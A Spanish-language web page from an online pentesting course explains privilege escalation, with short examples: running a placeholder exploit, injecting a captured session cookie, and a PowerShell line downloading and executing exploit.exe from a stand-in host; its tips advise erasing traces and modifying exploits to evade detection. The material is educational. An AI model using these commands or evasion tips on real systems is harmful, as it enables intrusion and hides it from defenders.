<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escalada de Privilegios</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-01-escalada-de-privilegios" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-01-escalada-de-privilegios" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-01-escalada-de-privilegios" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css?v=2" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725" crossorigin="anonymous"></script>  	
	</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-6 p-2 p-md-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-6 p-2 p-md-0 text-end">
				<a href="https://enterprisecampus.net/mod/pentesting/05-01-escalada-de-privilegios" class="px-2">EN</a></b>
	|
	<b class="px-2">ES</b>
	|
	<a href="https://campusempresa.cat/mod/pentesting/05-01-escalada-de-privilegios" class="px-2">CA</a>
<br>
			<cite>Construyendo la sociedad de hoy y del mañana</cite>
		</div>
	</div>
</div>
<div id="subheader" class="container-xxl">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective">El Proyecto</a> | 
<a href="/about">Sobre nosotros</a> | 
<a href="/contribute">Contribuir</a> | 
<a href="/donate">Donaciones</a> | 
<a href="/licence">Licencia</a>
		</div>
	</div>
</div>

<div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				 					<a href="/categ/languages">Lenguajes de Programación</a>
				 					<a href="/categ/frameworks">Frameworks y Librerías</a>
				 					<a href="/categ/tech-tools">Herramientas Técnicas</a>
				 					<a href="/categ/foundations">Fundamentos Teóricos</a>
				 					<a href="/categ/soft-skills">Habilidades Sociales</a>
							</div>
		</div>
	</div>
</div>
		
<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
				<div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='04-04-explotacion-sistemas' title="Explotación de Vulnerabilidades de Sistemas">
				<span class="d-none d-md-inline">&#x25C4; Anterior</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Escalada de Privilegios</h2></a>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-02-mantenimiento-del-acceso' title="Mantenimiento del Acceso">
				<span class="d-none d-md-inline">Siguiente &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>
<div class='content'><p>La escalada de privilegios es una técnica utilizada en pentesting para obtener un nivel de acceso más alto del que se tiene inicialmente en un sistema. Este proceso es crucial para maximizar el impacto de una explotación y acceder a recursos que están protegidos por permisos más estrictos.</p>
</div><h1><p>Conceptos Clave</p>
</h1>
<div class='content'><ol>
<li><strong>Privilegios</strong>: Los derechos y permisos que un usuario tiene en un sistema.</li>
<li><strong>Escalada de Privilegios Vertical</strong>: Obtener permisos de un nivel más alto (por ejemplo, de usuario a administrador).</li>
<li><strong>Escalada de Privilegios Horizontal</strong>: Obtener permisos de otro usuario con el mismo nivel de acceso (por ejemplo, de un usuario a otro usuario).</li>
</ol>
</div><h1><p>Tipos de Escalada de Privilegios</p>
</h1>
<div class='content'></div><h2><p>Escalada de Privilegios Vertical</p>
</h2>
<div class='content'><ul>
<li><strong>Objetivo</strong>: Obtener permisos administrativos o de root.</li>
<li><strong>Métodos Comunes</strong>:
<ul>
<li><strong>Explotación de Vulnerabilidades del Sistema</strong>: Utilizar exploits conocidos para vulnerabilidades en el sistema operativo.</li>
<li><strong>Errores de Configuración</strong>: Aprovechar configuraciones incorrectas que permiten la ejecución de comandos con permisos elevados.</li>
<li><strong>Credenciales Débiles</strong>: Encontrar y usar contraseñas débiles o por defecto.</li>
</ul>
</li>
</ul>
</div><h2><p>Escalada de Privilegios Horizontal</p>
</h2>
<div class='content'><ul>
<li><strong>Objetivo</strong>: Acceder a los recursos de otro usuario con el mismo nivel de privilegios.</li>
<li><strong>Métodos Comunes</strong>:
<ul>
<li><strong>Robo de Sesiones</strong>: Capturar tokens de sesión o cookies.</li>
<li><strong>Ingeniería Social</strong>: Engañar a los usuarios para que revelen sus credenciales.</li>
<li><strong>Errores en la Gestión de Sesiones</strong>: Explotar fallos en la implementación de la gestión de sesiones.</li>
</ul>
</li>
</ul>
</div><h1><p>Ejemplos Prácticos</p>
</h1>
<div class='content'></div><h2><p>Ejemplo 1: Escalada Vertical en Linux</p>
</h2>
<div class='content'><p>Supongamos que hemos encontrado una vulnerabilidad en un sistema Linux que nos permite ejecutar comandos como root.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDb21hbmRvIHBhcmEgZXhwbG90YXIgbGEgdnVsbmVyYWJpbGlkYWQKLi9leHBsb2l0CgojIFZlcmlmaWNhciBxdWUgYWhvcmEgdGVuZW1vcyBwZXJtaXNvcyBkZSByb290Cndob2FtaQojIFNhbGlkYSBlc3BlcmFkYTogcm9vdA=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Comando para explotar la vulnerabilidad
./exploit

# Verificar que ahora tenemos permisos de root
whoami
# Salida esperada: root</pre></div><div class='content'><p><strong>Explicación</strong>:</p>
<ul>
<li><code>./exploit</code>: Ejecuta un exploit que aprovecha una vulnerabilidad en el sistema.</li>
<li><code>whoami</code>: Verifica el nivel de acceso actual. La salida &quot;root&quot; indica que hemos escalado privilegios exitosamente.</li>
</ul>
</div><h2><p>Ejemplo 2: Escalada Horizontal mediante Robo de Sesiones</p>
</h2>
<div class='content'><p>Supongamos que hemos capturado una cookie de sesión de otro usuario en una aplicación web.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("Ly8gSmF2YVNjcmlwdCBwYXJhIGlueWVjdGFyIGxhIGNvb2tpZSBkZSBzZXNpw7NuIGNhcHR1cmFkYQpkb2N1bWVudC5jb29raWUgPSAic2Vzc2lvbl9pZD1hYmMxMjM7IHBhdGg9LzsgZG9tYWluPWV4YW1wbGUuY29tIjsKCi8vIFJlZnJlc2NhciBsYSBww6FnaW5hIHBhcmEgYXN1bWlyIGxhIHNlc2nDs24gZGVsIG90cm8gdXN1YXJpbwp3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>// JavaScript para inyectar la cookie de sesi&oacute;n capturada
document.cookie = &quot;session_id=abc123; path=/; domain=example.com&quot;;

// Refrescar la p&aacute;gina para asumir la sesi&oacute;n del otro usuario
window.location.reload();</pre></div><div class='content'><p><strong>Explicación</strong>:</p>
<ul>
<li><code>document.cookie</code>: Establece la cookie de sesión capturada.</li>
<li><code>window.location.reload()</code>: Recarga la página para aplicar la nueva sesión.</li>
</ul>
</div><h1><p>Ejercicio Práctico</p>
</h1>
<div class='content'></div><h2><p>Ejercicio 1: Escalada de Privilegios en un Sistema Windows</p>
</h2>
<div class='content'><p><strong>Objetivo</strong>: Utilizar una vulnerabilidad conocida para escalar privilegios en un sistema Windows.</p>
<p><strong>Instrucciones</strong>:</p>
<ol>
<li>Encuentra una vulnerabilidad en el sistema Windows que permita la escalada de privilegios.</li>
<li>Utiliza un exploit para aprovechar esta vulnerabilidad.</li>
<li>Verifica que has obtenido permisos elevados.</li>
</ol>
<p><strong>Solución</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBEZXNjYXJnYXIgeSBlamVjdXRhciB1biBleHBsb2l0IGNvbm9jaWRvIChwb3IgZWplbXBsbywgTVMxNi0wMzIpCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHA6Ly9leGFtcGxlLmNvbS9leHBsb2l0LmV4ZSIgLU91dEZpbGUgImV4cGxvaXQuZXhlIgouXGV4cGxvaXQuZXhlCgojIFZlcmlmaWNhciBwZXJtaXNvcyBlbGV2YWRvcwp3aG9hbWkKIyBTYWxpZGEgZXNwZXJhZGE6IE5UIEFVVEhPUklUWVxTWVNURU0="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Descargar y ejecutar un exploit conocido (por ejemplo, MS16-032)
Invoke-WebRequest -Uri &quot;http://example.com/exploit.exe&quot; -OutFile &quot;exploit.exe&quot;
.\exploit.exe

# Verificar permisos elevados
whoami
# Salida esperada: NT AUTHORITY\SYSTEM</pre></div><div class='content'><p><strong>Explicación</strong>:</p>
<ul>
<li><code>Invoke-WebRequest</code>: Descarga el exploit desde una URL.</li>
<li><code>.\exploit.exe</code>: Ejecuta el exploit descargado.</li>
<li><code>whoami</code>: Verifica el nivel de acceso actual. La salida &quot;NT AUTHORITY\SYSTEM&quot; indica que hemos escalado privilegios exitosamente.</li>
</ul>
</div><h1><p>Errores Comunes y Consejos</p>
</h1>
<div class='content'><ul>
<li><strong>No Verificar los Permisos</strong>: Siempre verifica que has obtenido los permisos deseados después de ejecutar un exploit.</li>
<li><strong>No Limpiar Huellas</strong>: Asegúrate de eliminar cualquier rastro de tus actividades para evitar ser detectado.</li>
<li><strong>Usar Exploits Públicos sin Modificación</strong>: Los exploits públicos pueden ser detectados por sistemas de seguridad. Modifícalos para evitar detección.</li>
</ul>
</div><h1><p>Conclusión</p>
</h1>
<div class='content'><p>La escalada de privilegios es una técnica esencial en el pentesting que permite a los atacantes maximizar su acceso y control sobre un sistema. Comprender los métodos y técnicas para escalar privilegios, tanto vertical como horizontalmente, es crucial para cualquier profesional de seguridad. En el próximo tema, exploraremos cómo mantener el acceso una vez que se ha obtenido, asegurando que el atacante pueda continuar sus actividades sin ser detectado.</p>
</div><div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='04-04-explotacion-sistemas' title="Explotación de Vulnerabilidades de Sistemas">
				<span class="d-none d-md-inline">&#x25C4; Anterior</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-02-mantenimiento-del-acceso' title="Mantenimiento del Acceso">
				<span class="d-none d-md-inline">Siguiente &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<!-- 
<h1>Publicidad</h1>
<p>Este espacio está destinado a publicidad.</p>
<p>Si quieres ser patrocinador, contáctanos para incluir enlaces en esta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
<p>¡Gracias por colaborar!</p>
-->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725"
     crossorigin="anonymous"></script>
<!-- enterprise_campus -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-0611338592562725"
     data-ad-slot="6914733106"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Todos los derechos reservados</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Usamos cookies para mejorar tu experiencia de uso y ofrecer contenidos adaptados a tus intereses.
    <a href="#" id="btn_accept_cookies" class="button">Aceptar</a>
    <a href="/cookies">Mas información</a>
</div>	

	</div>    
</body>
</html>
